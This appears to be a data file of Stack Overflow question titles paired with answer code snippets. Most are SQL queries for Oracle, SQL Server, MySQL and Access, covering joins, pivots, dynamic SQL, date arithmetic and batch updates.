| items       |
| jiveturkey  |
+-------------+
"
30873,61707,SQL: Recursion With a Join Confusion,"    select U2.Email as Subordinate,
    count(*) as NumLeads
    from USERS U2
    left join LEADS l
    on U2.Email = l.Owner
    where U2.ROLE = 'PEON'
    and lower(v('APP_USER')) in
        (select EMAIL
        from USERS S
        START WITH lower(v('APP_USER')) = lower(S.SUPPER)
        CONNECT BY PRIOR EMAIL = SUPPER)
    group by U2.Email
    order by U2.Email
"
8128,75528,Oracle : specify a larger or smaller in date data type,"SELECT CASE WHEN DATE_1 > DATE_2 THEN 'DATE_1 IS GREATER' 
            WHEN DATE_1 = DATE_2 THEN 'DATE_1 EQUAL to DATE_2'
                                 ELSE 'DATE_1 IS SMALLER'
       END
"
5571,52299,Complex model relationships in django,"class Project(models.Model):
    task_states = models.ManyToManyField(Task, through='TaskState')
"
4225,39052,Select a column using a variable?,"DECLARE @Column varchar(25)
SET @Column = 'Name' -- This can be another column also
SET @sqlText = N'SELECT ' + @Column + ' FROM MyTable'
EXEC (@sqlText)
"
7786,21576,SQL in Pairing Corresponding Duplicated Rows and Calculate Days Between (SSMS),"--Test Data
CREATE TABLE MORTGAGE (transactionType VARCHAR(20),collateral INT, transactionDate DATETIME)

INSERT INTO MORTGAGE VALUES('reinstatement',123,'Nov 24 2013')
INSERT INTO mortgage VALUES('returned',123,'Nov 21 2013')
INSERT INTO mortgage VALUES('reinstatement',123,'Jan 2 2013')
INSERT INTO mortgage VALUES('returned',123,'Jan 1 2013')

--Query
SELECT res1.collateral
     , DATEDIFF(DAY,res1.transactiondate,res2.transactiondate) AS [days between transactions]
FROM
    (SELECT TOP 100 PERCENT 
        TRANSACTIONTYPE, 
        COLLATERAL, 
        TRANSACTIONDATE
        ,ROW_NUMBER () over (partition by transactiontype order by transactiondate) artificialid
     FROM MORTGAGE 
     WHERE TRANSACTIONTYPE='returned'
     ORDER BY transactionDate) res1
INNER JOIN
    (SELECT TOP 100 PERCENT
        TRANSACTIONTYPE, 
        COLLATERAL, 
        TRANSACTIONDATE
        ,ROW_NUMBER () over (partition by transactiontype order by transactiondate) artificialid
     FROM MORTGAGE mret
     WHERE TRANSACTIONTYPE='reinstatement'
     ORDER BY transactionDate) res2
ON res1.artificialid = res2.artificialid
AND res1.TRANSACTIONDATE <> res2.TRANSACTIONDATE 
AND res1.TRANSACTIONDATE <> res2.TRANSACTIONDATE 

--Results
collateral  days between transactions
123         1
123         3
"
31591,13204,Update specific batch of records from minute to minute on SQL Server,"DECLARE @DATA_ID INT
DECLARE @MAX_DATA_ID INT

SET @DATA_ID = 0
SELECT @MAX_DATA_ID = MAX(id_ofMyTable) FROM MyTable

WHILE @DATA_ID <= @MAX_DATA_ID
BEGIN    
    IF @MAX_DATA_ID - @DATA_ID >= 1000
    BEGIN
            UPDATE myTable SET someField = someField WHERE id_ofMyTable >= @DATA_ID AND id_ofMyTable < @DATA_ID + 1000
        SET @DATA_ID = @DATA_ID + 1000
    END
    ELSE
    BEGIN
             UPDATE myTable SET someField = someField WHERE id_ofMyTable >= @DATA_ID AND  id_ofMyTable < @DATA_ID + (@MAX_DATA_ID - @DATA_ID)
        SET @DATA_ID = @DATA_ID + (@MAX_DATA_ID - @DATA_ID)
    END
    WAITFOR DELAY '00:00:01' --Set your sleep time here.    
END
"
13908,22941,Oracle SQLDeveloper: How to search which tables have a column matching given query?,"Select table_name, column_name 
from user_tab_columns 
where column_name like '%'|| '&columnPattern' || '%' 
"
28299,43763,Create Graphs in LINQPad,"Util.Image (""http://chart.apis.google.com/chart?cht=p3&chd=s:Uf9a&chs=350x140&chl=January|February|March|April"").Dump();
"
13436,58597,Trim leading zeros in comma separated values in a column,"select substr(replace(replace(replace(concat(',', store_id), ',0', ','),
                              ',0', ','),
                       ',0', ',')
              2, length(store_id)
"
6927,45711,postgres alter table and insert row probabilities,"select id1, 
       weight, 
       id2, 
       weight / sum(weight) over (partition by id1) as prob
from items
order by id1, id2;
"
31030,46605,Finding the next free time slot,"SELECT * FROM slots s1 WHERE
    s1.endTime > :inStartTime AND
    not exists (SELECT 1 FROM slots s2 WHERE s2.startTime > s1.endTime AND s2.startTime < DateAdd(s1.endTime, :inEndMinusInStart))
ORDER BY
    s1.startTime


// and criteria to tweak

DetachedCriteria subquery = DetachedCriteria.for(Slot.class)
    .add(<filter on resource>)
    .add(Restrictions.propertyGt(""startTime"", ""s1.endTime""));
    .add(Restrictions.propertylt(""startTime"", Projections.sqlFunction(""dateadd"", Projections.property(""s1.endTime""), inStartTime - inEndTime, Hibernate.dateTime));

session.createCriteria(Slot.class, ""s1"")
    .add(<filter on resource>)
    .add(Restrictions.gt(endTime, inStartTime))
    .add(Subqueries.notExists(subquery))
"
36938,47683,sql script to insert mutliple rows,"INSERT INTO my_table
SELECT  id, 3, binary
FROM    my_table t_outer
WHERE   type = 2 AND NOT EXISTS (SELECT *
                                 FROM   my_table t_inner
                                 WHERE  type = 3 AND t_inner.id = t_outer.id)
"
38984,29770,Get the latest value form the table using join,"SELECT  a.*, b.*      -- select your desired columns here
FROM    Tickets a
        INNER JOIN ObjectCustomFieldValues b
            ON b.ObjectId = a.id
        INNER JOIN
        (
            SELECT  ObjectId, MAX(created) max_val
            FROM    ObjectCustomFieldValues
            WHERE   CustomField = 301
            GROUP   BY ObjectId
        ) c ON  b.ObjectId = c.ObjectId AND
                b.created = c.max_val
WHERE   b.CustomField = 301 AND
        a.queue IN (27,50,49,52) AND
        a.status NOT IN ('rejected','deleted') AND 
        a.created BETWEEN SUBDATE(NOW(), INTERVAL 1500 MINUTE) AND NOW()
"
7534,61064,DB2 SQL Join and Max value,"SELECT 
     N.ACCTNUM AS ACCOUNTNUMBER
    ,N.NMELASTBUS AS LASTNAME
    ,N.NAME_FIRST AS FIRSTNAME
    ,N.BALDUE AS BALANCEDUE
    ,A.STREETNAME AS ADDR, 
    ,A.ADDRLINE2 AS 
    ,A.ADDRLINE2
    ,A.CITYPARISH AS CITY, 
    ,A.ADDRSTATE AS STATE,
    ,A.ZIPCODE AS ZIP, 
FROM NAMETABLE AS N 
JOIN ADDRESSTABLE AS A 
  ON N.ADDRESSID = A.ADDRESSID
WHERE N.BALANCEDUE >= '50.00'
  AND A.ADDRSEQUENCE = (
    SELECT MAX(ADDRSEQUENCE)
    FROM ADDRESSTABLE AS A2
    WHERE A.ADDRESSID = A2.ADDRESSID
)
"
9632,40167,Microsoft SQL between statement for characters is not inclusive?,"select * from tblprofile where firstname >= 'a' and firstname < 'e'
"
39832,49825,How to select records as columns in SQL,"DECLARE @Colors NVARCHAR(4000), @Query NVARCHAR(MAX)
SET @Colors = ''

SELECT @Colors = @Colors + '[' + C.Color +'],'
FROM tblTempProductSizesColors SC
INNER JOIN tblColors C on SC.ColorID=C.ID
GROUP BY Color
ORDER BY Color

SET @Colors = LEFT(@Colors,LEN(@Colors)-1)


SET @Query = '
SELECT *
FROM (  SELECT TS.Sizeid, TS.Width, TS.Height, TS.Depth, TC.Price, C.Color
        FROM tblTempProductSizes TS
        INNER JOIN tblTempProductSizesColors TC
        ON TS.SizeId = TC.SizeId INNER JOIN tblColors C on TC.ColorID=C.ID) A
        PIVOT(SUM(Price) FOR Color IN ('+@Colors+')) AS PT'

EXEC sp_executesql @Query
"
25963,49430,Pulling Text From a Memo Box Line by Line,"var
  StringList: TStringList;
  Line: string;
.....
StringList.Text := MemoFieldText;
for Line in StringList do
  Process(Line);
"
22809,3589,sql select distinct rows where item is like %,"CREATE TABLE [dbo].[tbl_Example](
    [ID] [int] NULL,
    [SKU] [varchar](50) NULL,
    [Computed_Product]  AS (substring([SKU],(1),(2))),
    [Computed_Brand]  AS (substring([SKU],(3),(2)))
) ON [PRIMARY]
GO
SET ANSI_PADDING OFF
GO
CREATE NONCLUSTERED INDEX [IX_Computed_BrandCode] ON [dbo].[tbl_Example] 
(
    [Computed_Brand] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, SORT_IN_TEMPDB = OFF, IGNORE_DUP_KEY = OFF, DROP_EXISTING = OFF, ONLINE = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
GO
CREATE NONCLUSTERED INDEX [IX_ComputedProductCode] ON [dbo].[tbl_Example] 
(
    [Computed_Product] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, SORT_IN_TEMPDB = OFF, IGNORE_DUP_KEY = OFF, DROP_EXISTING = OFF, ONLINE = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
GO
INSERT [dbo].[tbl_Example] ([ID], [SKU]) VALUES (1, N'ASdasdasdL')
INSERT [dbo].[tbl_Example] ([ID], [SKU]) VALUES (2, N'1231f2efwdsfas')
INSERT [dbo].[tbl_Example] ([ID], [SKU]) VALUES (3, N'sdf23re2fwdf')
"
8191,29540,"MySQL, quickest way to select on a phrase as separate words?","WHERE Keywords.Word IN ('$search[0]','$search[1]',...)
"
39567,60619,how to select where entire field is uppercase in sql,"SELECT * FROM TABLE_NAME WHERE COLUMN_NAME COLLATE Latin1_General_CS_AI=UPPER (COLUMN_NAME)
"
17067,4249,How to define a constant in oracle?,"declare
  id constant number := 2;
begin
  /* Some stuff here */
  ...
end;
"
19704,14255,SQL: How to order a union alphabetically?,"select name 
from Reviewer
union
select model
from Car
order by name;
"
26673,8820,SQL: Using two dates from other query to select data between date interval,"SELECT  DISTINCT a.v, a.circle_ts 
FROM    t1 a
        INNER JOIN t2 b
            ON a.circle_ts BETWEEN b.start_ts AND b.end_ts
WHERE   b.meter_id = 10
"
8261,44635,How do I create a constraint in Oracle to avoid duplicate values?,"create unique index ix_email on EMPS (email);
"
34572,58165,MySQL Slow Query Optimisation,"SELECT e.id AS id, e.name AS name, e.url AS url, p.action AS action, gk.key AS `key`
FROM event AS e
    LEFT JOIN participation AS p ON (p.event=e.id AND p.person='139160')
    LEFT JOIN goldenkey AS gk ON gk.issuedto=p.person
"
9983,21673,Increasing the speed of a query with a sub select?,"SELECT * 
  FROM eshop_items AS ite 
 WHERE ItemId IN (
       SELECT attItemId
         FROM eshop_items_attributes 
        WHERE attType=5 
          AND attValue='20')
 ORDER BY itemAdded DESC 
 LIMIT 0, 18 
"
32542,61017,ms access: how to store the contents of a table in a string array?,"Dim objConnection as ADODB.Connection
Dim objRecordSet as ADODB.Recordset
Dim arrTest as variant

Set objConnection = CurrentProject.Connection
Set objRecordSet = New ADODB.Recordset

objRecordSet.Open ""SELECT * FROM YourTable"" , objConnection, _
    adOpenStatic, adLockOptimistic

arrTest = objRecordSet.GetRows

objRecordSet.Close

objConnection.Close
"
33865,43067,Which SQL clause should be used?,"select
    serviceno,
    (select username
       from usernames
      where services.user1 = usernames.code) as user1,
    (select username
       from usernames
      where services.user2 = usernames.code) as user2,
    (select username
       from usernames
      where services.user3 = usernames.code) as user3
from
    services
"
37891,20724,SQL User Defined Function question,"SELECT UserName 
FROM BillingTransactions
GROUP BY UserName
HAVING 0 = SUM(
  CASE RecordType 
  WHEN 1 THEN AMOUNT 
  WHEN 0 THEN -AMOUNT 
  ELSE 0
  END);
"
22110,51195,"MySQL UPDATE, MAX, JOIN query","UPDATE  summary_table
SET     max_score = 
        (   SELECT  MAX(m.Product_ID) [MaxScoreProductID] 
            FROM    manu_table m
                    INNER JOIN product_table p
                        ON m.Product_ID = p.Product_ID
                    INNER JOIN
                    (   SELECT  Manufacturer, MAX(Score) [MaxScore]
                        FROM    manu_table m
                                LEFT JOIN product_table p
                                    ON m.Product_ID = p.Product_ID
                        GROUP BY Manufacturer
                    ) ms
                        ON ms.Manufacturer = m.Manufacturer
                        AND ms.MaxScore = p.Score
            WHERE   m.Manufacturer = summary_table.Manufacturer
            GROUP BY m.Manufacturer
        )
"
24356,41207,Add users and groups to other groups and get all the hierarchy to top using sql,"    WITH UserBelongTo (Type,EntityID,GroupID)
AS
(
    select a.Type, a.EntityID, a.GroupID from Groups a 
    where a.EntityID in  (select Groups.GroupID from Groups where EntityID=1 and Type=1)
    and a.Type=2

    union all
    select a.Type, a.EntityID, a.GroupID from Groups a 
    inner join UserBelongTo c on c.GroupID=a.EntityID
    where  a.Type=2
)   

select distinct  * from UserBelongTo
"
16058,11499,creating a special view or function,"select *
from A a1
where not exists (select 1 from A a2 where a1.codeID = a2.codeID and a2.edate > a1.edate)
"
14107,75011,concatenation fails to add null field,"SET CONCAT_NULL_YIELDS_NULL OFF;
"
18078,35845,SQL include results where id does not exists in related table,"SELECT * 
FROM user U
LEFT OUTER JOIN results R ON R.user_id = U.user_id
WHERE R.result_id IS NULL
    OR(R.result_id IS NOT NULL AND R.module_id <> 1)
"
7125,51803,'SELECT *' from inner joined tables,"sp_help tablename
"
5397,17438,Multirow insert into statement in MS Access,"INSERT INTO [Students](P_Id,FirstName, LastName, class,  city,Phone)
SELECT 123 As P_ID, 'Avi' As FirstName, 'Davis' As LastName, 2 As Class,
        'Tel-Mond' As City,'03-456789' As Phone FROM AnyTable
UNION
<...>
"
14269,32809,How to run a subquery based on results of a query SQL,"SELECT  r.CustomerID,
        t.ServiceID,
        t.dtCreated,
        Upgraded = CASE WHEN t.ServiceID = cp.ServiceID THEN 0 ELSE 1 END
FROM    Transactions AS t
        INNER JOIN
        (   SELECT  CustomerID,
                    ServiceID,
                    dtCreated,
                    RowNumber = ROW_NUMBER() OVER(PARTITION BY CustomerID ORDER BY dtCreated DESC)
            FROM    Transactions
            WHERE   transactiontype = 'Cust Purchase'
        ) AS cp
            ON cp.CustomerID = t.CustomerID
            AND cp.RowNumber = 1
WHERE   t.dtcreated > @startdate 
AND     t.dtcreated < @enddate
AND     t.transactiontype = 'Cust Save'
"
31454,40137,What are best practices for multi-language database design?,"Table ""Product"":
----------------
ID                 : int
<any other language-neutral fields>


Table ""ProductTranslations""
---------------------------
ID                 : int      (foreign key referencing the Product)
Language           : varchar  (e.g. ""en-US"", ""de-CH"")
IsDefault          : bit
ProductDescription : nvarchar
<any other localized data>
"
20460,22997,What is the most efficient structure to save data in my database?,"class User():
    name = CharField()
    # other user info

class Video():
    name = CharField()
    # othter video info

class Playlist():
    user = ForeigenKey(User)
    name = CharField()

class PlaylistVideo():
    plist = ForeigenKey(Playlist)
    video = ForeigenKey(Video)

# When a user adds a video to one of his playlist
def add_video_to_playlist(user_name, playlist_name, video_name)
    user = User.objects.get(name=user_name)
    plist = Playlist.objects.get(user=user, name=playlist_name)

    video = Video.objects.get(name=video_name)
    plv = PlaylistVideo(plist=plist,video=video)
    plv.save()

# To get the content of a user's some playlist:
def get_playlist_content(user_name, playlist_names):
    user = User.objects.get(name=user_name)
    plist = Playlist.objects.get(user=user, name=playlist_name)

    return [plv.video for plv in PlaylistVideo.objects.filter(plist=plist)]
"
20525,72061,How to return the latest record to each person ID in SQL,"SELECT *
FROM TPER_VISA t1
WHERE per_visa_ed <= '20151101'
AND NOT EXISTS (select 1 from TPER_VISA t2
                where t2.personId = t1.personId
                  and t2.per_visa_ed <= '20151101'
                  and t2.per_visa_ed > t1.per_visa_ed)
ORDER BY per_visa_ed
"
37255,43454,ORACLE query help regarding datetime,"select * from cns_concerto_projects 
where SST_CREATION_DATE > TO_DATE('02/27/2010 16:07:07', 'mm/dd/yyyy HH24:MM:SS') 
AND 
(SST_MODIFIED_DATE > TO_DATE('03/26/2010 11:42:07', 'mm/dd/yyyy HH24:MM:SS') And SST_MODIFIED_DATE < sysdate)
"
18533,32397,Join data from two tables without unique key,"SELECT
  t1.ProductId, t1.year, t1.sales, t2.category
FROM table1 AS t1
INNER JOIN table2 AS t2 ON t1.productId = t2.productId;
"
5043,70643,deleting second comma in data,"Drop table T1;
Create table T1(Name varchar(100));
Insert T1 Values
('smith,steve'),
('smith,steve,j'),
('smith,ryan,tom');



UPDATE T1
SET Name=
            CASE CHARINDEX(',',name,    CHARINDEX(',',name)+1) WHEN 
                0 THEN Name
            ELSE
                LEFT(name,CHARINDEX(',',name,   CHARINDEX(',',name)+1)-1)+' ' +
                RIGHT(name,LEN(Name)-CHARINDEX(',',name,    CHARINDEX(',',name)+1)) 
            END
Select * from T1    
"
21745,11824,MySQL select all dates that are an increment of x days,"SELECT
     *
FROM table
WHERE
    date >= CURDATE()
    AND
    DATEDIFF(CURDATE(), date) % 6 = 0
"
24169,27794,Purging Database - Count purged/not-purged tables,"declare @objcursor as cursor; 

DECLARE @SQL nvarchar(max), @Schema sysname, @Table sysname;
SET @SQL = ''
SELECT @SQL = @SQL + 'SELECT '''+QUOTENAME(TABLE_SCHEMA)+'.'+
  QUOTENAME(TABLE_NAME)+''''+
  '= COUNT(*) FROM '+ QUOTENAME(TABLE_SCHEMA)+'.'
+QUOTENAME(TABLE_NAME) +' WHERE getDate() - [YOUR_COLUMN_NAME] >30;'
FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'
PRINT @SQL                -- test & debug
EXEC sp_executeSQL      @SQL,   -- getting variable input / setting variable output
                       ,N'@cursor cursor output', -- params definition

                        @objcursor output    -- output parameter

fetch next from @objcursor into @TableName,@Schema
while (@@fetch_status = 0)
begin
    /*Do Something With Your Table Name, eg delete, truncate, whatever*/    

fetch next from @objcursor into @Table,@Schema
end
"
10852,68829,Return all rows when one value is hit,"SELECT id, [date]
FROM mytable
WHERE id IN (SELECT Id  
             FROM mytable
             WHERE [date] IN ('2016-03-02', '2016-04-02', '2016-05-02'))
"
20467,15696,Mysql Row to Column with ';' separator,"CREATE  PROCEDURE `explode_table`(bound VARCHAR(255))
BEGIN

DECLARE id INT DEFAULT 0;
DECLARE value TEXT;
DECLARE occurance INT DEFAULT 0;
DECLARE i INT DEFAULT 0;
DECLARE splitted_value varchar(25);
DECLARE done INT DEFAULT 0;
DECLARE cur1 CURSOR FOR SELECT table1.id, table1.value
                                     FROM table1
                                     WHERE table1.value != '';
DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = 1;

DROP TEMPORARY TABLE IF EXISTS table2;
CREATE TEMPORARY TABLE table2(
`id` INT NOT NULL,
`value` VARCHAR(56) NOT NULL
) engine=memory;

OPEN cur1;
  read_loop: LOOP
    FETCH cur1 INTO id, value;
    IF done THEN
      LEAVE read_loop;
    END IF;

    SET occurance = (SELECT LENGTH(value)
                             - LENGTH(REPLACE(value, bound, ''))
                             +1);
    SET i=1;
    WHILE i <= occurance DO
      SET splitted_value =
      trim((SELECT REPLACE(SUBSTRING(SUBSTRING_INDEX(value, bound, i),
      LENGTH(SUBSTRING_INDEX(value, bound, i - 1)) + 1), ';', '')));

      INSERT INTO table2 VALUES (id, splitted_value);
      SET i = i + 1;

    END WHILE;
  END LOOP;

 CLOSE cur1;

 SELECT * FROM table2;
 END
"
2337,25607,TSQL left join UPDATE by select appropriate single value,"UPDATE  t
SET     total = (someformula) * r.fee
FROM    trades AS t
JOIN    rates AS r
ON      r.rateid = t.rateid
WHERE   t.userid = (somevalue)
"
22723,31357,MySQL query to group by and use distinct row,"SELECT pattern, cost, trunks 
FROM sms_prices 
WHERE cost = (select min(cost) from sms_prices where pattern = 1)
GROUP BY pattern;
"
32545,65110,How can I see if a date is on a weekend?,"SELECT ID, Name, TDate
FROM your_table
WHERE EXTRACT(WEEKDAY FROM TDate) IN (6,0)
"
24480,32753,how to order by desc if i have a table with max that has more than one max values?,"select *
from students
order by grade, student_name;
"
39879,27775,SQL Trigger - Maximo Workorders - Supervisor/Owner Initialization,"create trigger Trig_WorkOrder for insert, update as
BEGIN
update wo
set location = pwo.location, ...
from dbo.workorder as wo, inserted as i, dbo.parentworkorder as pwo
where wo.serialNo = i.SerialNo -- join with the actual table-entry
and wo.pwo_id = pwo.id -- join with the parentworkorder
and i.ownergroup is null -- do it if new value is empty
and (pwo.ownergroup is not null or pwo.ownergroup <> '') -- do it if parentvalue is not empty
and (pwo.Supervisor is not null or pwo.Supervisor <> '') -- do it if parentvalue is not empty

update wo
set location = pwo.location, ...
from dbo.workorder as wo, inserted as i, dbo.standardworkorder as pwo
where wo.serialNo = i.SerialNo 
and wo.location = pwo.location
and wo.ownergroup is null
and (pwo.ownergroup is null or pwo.ownergroup = '')
and (pwo.Supervisor is null or pwo.Supervisor = '')
END
"
39223,55889,Can I return multiple counters in the same query result (oracle)?,"select 
   Sum(case when cond1 = 1 then 1 else 0 end) as count1,
   Sum(case when cond1 = 1 and cond2 = 1 then 1 else 0 end) as count2
from table;
"
34746,45971,Event/Time and criteria based SQL,"SELECT a.* 
FROM user a 
LEFT JOIN event b ON (b.user = a.id AND b.event = 'userjoined') 
WHERE a.joineddt < '1 week ago date' 
AND b.id IS NULL
"
31566,50415,Adding 1 day to a date value in SQL Developer,"  CASE
    WHEN x.cre_dttm <= DATEADD(Day,1,y.cc_dttm) 
    THEN 'y_after_x_cre'
    ELSE 'y_before_x_cre'
  END ""something""
"
33912,60680,How to turn an Oracle multi-parameter subquery into an MS SQL subquery(ies),"and exists (
  select 1 
  from (select tax_code, max(effect_date) effect_date
         from   v_txtaxrate
         where  effect_date <= '10-JAN-14'
         group by tax_code) a
  where rate.tax_code = a.tax_code
    and rate.effect_date = a.effect_date
)
"
28351,59327,Can I avoid doing this Row by Row,"SELECT 
    us.UsersShiftsId,
    us.UserId,
    us.ShiftStart,
    us.ShiftEnd,
    MIN(fs.ScannedTime) ActualStart,
    MAX(fs.ScannedTime) ActualEnd
FROM UsersShifts us
LEFT JOIN FingerprintScan fs
    ON us.UserId = fs.UserId
    AND fs.ScannedTime BETWEEN us.ShiftStart AND us.ShiftEnd 
GROUP BY
    us.UsersShiftsId,
    us.UserId,
    us.ShiftStart,
    us.ShiftEnd
"
16859,14551,select comparison operator on basis of parameter,"SELECT *
  FROM MyTable
 WHERE (p_strOperator = '=' AND MyColumn = p_dtClosingDate)
    OR (p_strOperator = '>' AND MyColumn > p_dtClosingDate)
    OR (p_strOperator = '<' AND MyColumn < p_dtClosingDate);
"
8098,16209,Multiple synonym dictionary matches in PostgreSQL full text searching,"bob    robert
bobby  robert
alan   al
albert al
allen  al
"
23632,57549,query based on sql,"select * from people where year(now())-year(dob)>50 order by dob limit 1; 
"
39930,66404,SQL To MS Access SQL Query,"select p.*
from table1 as p
where p.field1 = (select max(p2.field1)
                  from table1 as p2
                  where p2.pk_id = p.pk_id
                 );
"
33237,41005,SQl Server: Add seconds to a datetime field?,"UPDATE tbluser SET DateField = DATEADD(ss,numOfSeconds,DateField)
"
18679,24476,Efficient Technique to Calculate Geographic Union of Many Polygons,"SELECT City,
geography::UnionAggregate(SpatialLocation) AS SpatialLocation
FROM Person.Address
WHERE PostalCode LIKE('981%')
GROUP BY City;
"
11368,52571,Loops within dynamic SQL,"--Declare a table variable to hold your table names (and column names in case needed)
declare @listOfTablesToUpdate table (tableName varchar(100), columnNameToUpdate varchar(50))

--insert the tables that you want to work with.
insert into @listOfTablesToUpdate values ('Table1', 'column2')
insert into @listOfTablesToUpdate values ('Table2', 'column3')
insert into @listOfTablesToUpdate values ('Table3', 'column4')

--Cursor for iterating
declare @tableCursor cursor,
        @tableName varchar(100),
        @columnName varchar(50)

set @tableCursor = cursor for select * from @listOfTablesToUpdate

open @tableCursor
fetch next from @tableCursor into @tableName, @columnName
while(@@fetch_status = 0)
begin
    --dynamic sql
    declare @sql varchar(max)

    --Your logic here...this is just an example
    set @sql = 'update '+@tableName+' set '+@columnName+' = '+<value>+' where '+@columnName +' = '+<someothervalue>
    exec @sql

    fetch next from @tableCursor into @tableName, @columnName
end

close @tableCursor
deallocate @tableCursor
"
23059,20139,SQL outer join with multiple foreign keys referencing the same table,"select t2_1.name, t2_2.name, t2_3.name, t2_4.name, t2_5.name
from table1 t1 left join
     table2 t2_1
     on t1.p1 = t2_1.id left join
     table2 t2_2
     on t1.p2 = t2_2.id left join
     table2 t2_3
     on t1.p3 = t2_3.id left join
     table2 t2_4
     on t1.p4 = t2_4.id left join
     table2 t2_5
     on t1.p5 = t2_5.id;
"
31193,47735,SQL join to correlated subquery where tables are related by overlapping ranges,";with cte as 
(
    SELECT *,
        ROW_NUMBER() OVER (PARTITION BY i.id ORDER BY e.EventDate DESC) as rNum
    FROM Item i
    JOIN Event e
        ON i.id between e.ItemStart and e.ItemEnd
)

SELECT ID,
  Name, 
  EventType,
  EventDate FROM cte
WHERE rNum = 1
"
38039,6044,sql (query) checking for duplicate record on duplicate columns,"select field1, field2, field3, field4, count(*)
from mytable
group by 1,2,3,4
having count(*) > 1;
"
495,48416,"sql insert using select, case and subquery inside","select * into #transacTbl from tmpTrans
insert
   select tmpT.ID,
       (case when tmpT.TranStatus = 10
        then 'Returned'
        else 'GoodSale'
        end)
   from
      (select * from MainTransacSource) as tmpT <OR simply MainTransacSource tmpT (maybe)>
"
1024,8934,$wpdb MySQL select from main table and join each row with two rows of another table,"select
  main_table.user_id,
  concat(s1.meta_value, ' ', s2.meta_value) as name
from
  main_table left join secondary_table s1
  on main_table.user_id = s1.user_id and s1.meta_key = 'first_name'
  left join secondary_table s2
  on main_table.user_id = s2.user_id and s2.meta_key = 'last_name'
where
  referrer = $referrer
"
18402,47026,slow sql query execution,"select count(*) from tbl
"
14354,69921,Join three tables with JOIN and HABTM association,"SELECT  ic.name, ic.icon_path 
FROM    item_characteristics ic
        INNER JOIN item_to_characteristics as itch 
            ON itch.characteristic_id = ic.id
        INNER JOIN items
            ON items.id=itch.item_id
WHERE   items.id = 25;
"
33378,40895,Issues Joining Multiple Tables in Access,"INNER JOIN Inventory ON tbl_IMPORT.[Bill Date] = Inventory.[Bill Date]
INNER JOIN Device ON Inventory.[ID]=Device.[ID]
"
34829,39900,declaring T-Sql parameter for comma delimited list of integers,"CREATE PROCEDURE IP_MAX_PERF_DATE 
@prod_no  nvarchar(500)
AS
BEGIN
SET NOCOUNT ON;
declare @statement nvarchar(1000)
set @statement = N'SELECT [prod_season_no], MAX([perf_dt]) As max_dt FROM [T_PERF] WHERE [prod_season_no] IN (' + @prod_no + ') GROUP By [prod_season_no]'
EXEC sp_executesql 
         @stmt = @statement
END
GO
"
3150,16145,Why am i getting the same result for different columns,"SQL> VAR startoffset NUMBER
SQL> VAR endoffset   NUMBER
SQL> EXEC :startoffset := 4260; :endoffset := 4740;

PL/SQL procedure successfully completed.

SQL> SELECT TO_TIMESTAMP_TZ(TO_CHAR((TO_DATE('3/13/2012 7:00 PM'
  2                                  ,       'MM/DD/YYYY HH:MI AM')
  3                               - (3300  / 24 / 60))
  4                               + (:startoffset / 24 / 60)
  5                         ,        'YYYY-MM-DD HH24:MI:SS')
  6         ,               'YYYY-MM-DD HH24:MI:SS TZH:TZM')    AS shift_start_date
  7  ,      TO_TIMESTAMP_TZ(TO_CHAR((TO_DATE('3/14/2012 1:00 AM'
  8                                  ,       'MM/DD/YYYY HH:MI AM')
  9                               - (5220 / 24 / 60))
 10                               + (:endoffset   / 24 / 60)
 11                         ,        'YYYY-MM-DD HH24:MI:SS')
 12         ,               'YYYY-MM-DD HH24:MI:SS TZH:TZM')    AS shift_end_date
 13  FROM DUAL;

SHIFT_START_DATE                                                            SHIFT_END_DATE
--------------------------------------------------------------------------- ---------------------------------------------------------------------------
14-MAR-12 11.00.00.000000000 AM -05:00                                      13-MAR-12 05.00.00.000000000 PM -05:00

SQL>
"
30471,54624,Sql return one row from right table every left table result,"select t1.ip, t1.count, t2.name
from table1 t1 
    join table2 t2 on t1.ip = t2.ip
group by t1.ip
"
14652,29027,linq match word with boundaries,"from row in table.AsEnumerable()
where row.Foo.Split(new char[] {' ', '\t'}, StringSplitOptions.None)
    .Contains(""abc"")
select row
"
38019,19963,Folder hierarchy of bookmarks in Android Browser,"  values.put(BrowserContract.Bookmarks.PARENT, mCurrentFolder);
"
23928,11727,get grouped data by conditions during date,"SELECT '2014-09-30' as from,
       '2014-10-06' as to,
       COUNT(*) AS DIALS_CNT,   
       SUM(CASE WHEN dc.call_result = 'APPT' THEN 1 ELSE 0 END) AS APPT_CNT,
       SUM(CASE WHEN dc.call_result = 'CONV_NO_APPT' THEN 1 ELSE 0 END) AS CONVERS_CNT ,
       SUM(CASE WHEN dc.call_result = 'CANNOT_REACH' THEN 1 ELSE 0 END) AS CANNOT_REACH_CNT 
  FROM dialed_calls dc
 WHERE  dc.date BETWEEN '2014-09-30' AND '2014-10-06'
"
8082,38142,Apex dynamic report based on LOV,"select * from reportview where reportname = :P123_REPORT_NAME;
"
22416,28936,Simple SQL query not giving proper results,"SELECT * FROM tagResourceName a 
INNER JOIN tagResource b ON a.tagID=b.tagID
GROUP BY a.tagName, a.tagID
ORDER BY a.tagID
"
29091,61222,"MySQL Query: How to sum 3 different values in a column, showing total of each value in result set","SELECT item, 
  sum(case when `condition` = 'poor' then 1 else 0 end) as poor, 
  sum(case when `condition` = 'fair' then 1 else 0 end) as fair, 
  sum(case when `condition` = 'good' then 1 else 0 end) as good
FROM inventory 
GROUP BY item
"
1132,59638,MySQL creating view which is union of two tables with one tables values prefixed,"SELECT CONCAT('AUTH_',blog.authors.id)
FROM db.authors
UNION 
SELECT authority 
FROM db.authorities_real
"
13233,49239,Case statement for null Records,"SELECT CASE WHEN STATE='NY' THEN 'New York'
            ELSE 'No Records' end
from 
  abc
where 
  state in ('&state')
"
18040,18256,How to select columns randomly in mysql for android,"String query = ""SELECT "";
boolean[] chosen = new boolean{false, false, false, false};
Random rand = new Random();
for(int i=0;i<4;i++)
{
    if(i > 0)
        query += "", "";
    int c = rand.nextInt(4); 
    while(chosen[c])
        c = rand.nextInt(4);
    chosen[c] = true;
    query += ""b"" + Integer.toString(c+1);
}
query += "" FROM Answers WHERE _id='""+n+""';""
"
21148,34731,SQL Query Help: Returning distinct values from Count subquery,"SELECT Number
FROM Notes 
WHERE Result = 'NA'
